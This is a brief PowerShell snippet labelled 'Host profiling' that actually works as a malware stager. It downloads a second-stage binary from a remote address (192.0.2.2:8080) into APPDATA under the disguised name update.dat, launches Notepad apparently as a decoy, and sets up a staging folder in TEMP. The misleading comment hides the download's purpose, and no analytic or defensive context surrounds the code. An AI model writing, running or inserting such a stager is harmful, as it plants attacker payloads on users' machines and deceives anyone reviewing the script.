
<# Host profiling #> $DownloadUrl = 'http://192.0.2.2:8080/cdn/stage2.bin'; $PayloadPath = "$env:APPDATA\update.dat"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $PayloadPath); & 'notepad.exe'; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Set-Location -Path $env:TEMP
